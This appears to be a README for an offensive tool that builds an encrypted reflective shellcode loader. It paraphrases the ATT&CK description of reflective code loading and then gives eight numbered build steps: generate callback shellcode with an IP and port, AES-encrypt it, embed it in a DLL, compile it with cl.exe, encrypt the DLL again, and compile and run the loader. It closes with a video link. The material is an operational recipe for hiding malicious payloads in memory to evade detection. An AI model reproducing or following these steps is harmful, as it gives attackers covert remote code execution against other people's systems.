Reflective Code Loading -PIS Shell Code Reflective Source Loader:
Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).

Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the Assembly.Load() method executed by PowerShell may be abused to load raw code into the running process.[

Reflective code injection is very similar to Process Injection except that the "injection" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution

##Reflective Loader Source

##Commands:

1-python pis.py --ip 127.0.0.1 --port 443 --language c --save True --output pis.bin

2-python aes.py pis.bin

3-insert aes code inside :dll-nss.cpp 

4-compile DLL --run with vs mode
cl.exe /W0 /D_USRDLL /D_WINDLL *.c *.cpp /MT /link /DLL /OUT:dll-nss.dll del *.obj *.lib *.exp

5-python aes.py dll-nss.dll > dll-nss.txt

6-insert aes keys inside rloader.cpp

7-cl rloader.cpp 

8-execute rloader.exe

Youtube link :
https://youtu.be/-t7u4QYvNKg

